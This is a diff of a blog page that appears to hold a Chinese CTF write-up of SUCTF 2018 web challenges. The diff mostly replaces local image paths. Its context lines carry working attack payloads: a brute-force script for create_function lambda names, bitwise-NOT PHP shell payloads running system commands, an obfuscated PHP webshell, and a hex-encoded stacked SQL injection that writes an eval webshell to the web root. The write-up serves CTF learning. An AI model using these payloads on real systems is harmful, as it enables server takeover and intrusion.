@@ -86,14 +86,14 @@
 <meta property="og:image" content="https://i.loli.net/2020/04/11/hAkqpG5VBIcO2jQ.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/11/LSC4AfQJTwXE1Mp.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/11/NMqoJHZwPCL3p2d.png">
-<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_18-53-17.png">
-<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_19-06-00.png">
-<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_19-37-28.png">
-<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_20-29-46.png">
-<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_21-07-25.png">
-<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_22-53-36.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/11/FSIxTCYn2RjfApE.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/11/3JpKbVZC2Uku1xo.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/11/fMKQO3j4luSp5bN.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/11/iF2SasLu4cPtzU3.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/11/n6xOef7up9vEGcV.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/11/J1s9AvfiX4Q2mrh.png">
 <meta property="article:published_time" content="2020-04-02T13:32:32.000Z">
-<meta property="article:modified_time" content="2020-04-11T15:03:16.823Z">
+<meta property="article:modified_time" content="2020-04-11T15:06:05.262Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
@@ -591,12 +591,12 @@
 <p><img src="https://i.loli.net/2020/04/11/NMqoJHZwPCL3p2d.png" alt="Snipaste_2020-04-11_17-13-20.png"></p>
 <hr>
 <h4><span id="suctf-2018annonymous">[SUCTF 2018]annonymous</span></h4><p>源码</p>
-<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_18-53-17.png" alt="Snipaste_2020-04-11_18-53-17"></p>
+<p><img src="https://i.loli.net/2020/04/11/FSIxTCYn2RjfApE.png" alt="Snipaste_2020-04-11_18-53-17.png"></p>
 <p><code>create_function()</code>这个函数的漏洞，他create之后会自动生成一个函数名为<code>%00lambda_%d</code></p>
 <p><code>%d</code>代表是进程中的第几个匿名函数，爆破出<code>$MY</code>即可</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">while True:</span><br><span class="line">    r&#x3D;requests.get(&#39;http:&#x2F;&#x2F;6c2d621c-b6b5-484d-a4fe-48959d98450f.node3.buuoj.cn&#x2F;?func_name&#x3D;%00lambda_1&#39;)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure>
 
-<h4><span id="suctf-2018getshell">[SUCTF 2018]GetShell</span></h4><p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_19-06-00.png" alt="Snipaste_2020-04-11_19-06-00"></p>
+<h4><span id="suctf-2018getshell">[SUCTF 2018]GetShell</span></h4><p><img src="https://i.loli.net/2020/04/11/3JpKbVZC2Uku1xo.png" alt="Snipaste_2020-04-11_19-06-00.png"></p>
 <p>从第六位开始检测字符，bp跑一下，只能用<code>$()[]_=;~</code></p>
 <p>考点是无字母shell，p牛提供了三种思路，<code>+</code>和<code>^</code>也被过滤，还可以考虑取反</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">'phpinfo'</span>;</span><br><span class="line">$b = urlencode(~$a);</span><br><span class="line">(~urldecode($b))();</span><br></pre></td></tr></table></figure>
@@ -604,11 +604,11 @@
 <p>这里由于从第六位开始判断，需要使用短标签<code>&lt;?=</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>= (~(�������))();</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_19-37-28.png" alt="Snipaste_2020-04-11_19-37-28"></p>
+<p><img src="https://i.loli.net/2020/04/11/fMKQO3j4luSp5bN.png" alt="Snipaste_2020-04-11_22-53-36.png"></p>
 <p><code>eval()和assert()</code>失败，直接使用<code>system()</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a = <span class="string">'system'</span>;</span><br><span class="line">$b = urlencode(~$a);</span><br><span class="line">$c = <span class="string">'ls /'</span>;</span><br><span class="line">$d = urlencode(~$c);</span><br><span class="line"><span class="keyword">echo</span> $b.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $d;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_20-29-46.png" alt="Snipaste_2020-04-11_20-29-46"></p>
+<p><img src="https://i.loli.net/2020/04/11/iF2SasLu4cPtzU3.png" alt="Snipaste_2020-04-11_20-29-46.png"></p>
 <p>结果最后读到的是<code>SUCTF{fake_flag_web_b}</code></p>
 <p>另一种方法</p>
 <p>fuzz代码</p>
@@ -621,7 +621,7 @@
 <p>文件编码改成<code>ISO-8859-15</code>，写入payload保存</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=$_=[];$__.=$_;$____=$_==$_;$___=~北[$____];$___.=~内[$____];$___.=~北[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_21-07-25.png" alt="Snipaste_2020-04-11_21-07-25"></p>
+<p><img src="https://i.loli.net/2020/04/11/n6xOef7up9vEGcV.png" alt="Snipaste_2020-04-11_21-07-25.png"></p>
 <hr>
 <h4><span id="suctf-2018multisql">[SUCTF 2018]MultiSQL</span></h4><p>注册登录</p>
 <p>构造<code>?id=2-1</code>确认存在数字型sql注入，但是根据一些payload的回显猜测存在一些替换</p>
@@ -631,11 +631,12 @@
 <p>写shell成功</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;select &#39;&lt;?php eval($_POST[_]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;;&quot;.encode(&#39;hex&#39;))</span><br><span class="line"></span><br><span class="line">&#x3D;&gt;</span><br><span class="line"></span><br><span class="line">?id&#x3D;1;set @a &#x3D; 0x73656c65637420273c3f706870206576616c28245f504f53545b5f5d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c312e706870273b;prepare smtm_test from @a;execute smtm_test;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-04-11_22-53-36.png" alt="Snipaste_2020-04-11_22-53-36"></p>
+<p><img src="https://i.loli.net/2020/04/11/J1s9AvfiX4Q2mrh.png" alt="Snipaste_2020-04-11_19-37-28.png"></p>
 <p><code>load_file()</code>读取文件</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $black_str = <span class="string">"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i"</span>;</span><br><span class="line"></span><br><span class="line">    $str = preg_replace($black_str, <span class="string">"@@"</span>,$str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> addslashes($str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <hr>
+<p>##############</p>
 <h4><span id="suctf-2018homework">[SUCTF 2018]Homework</span></h4>
             </div>
           
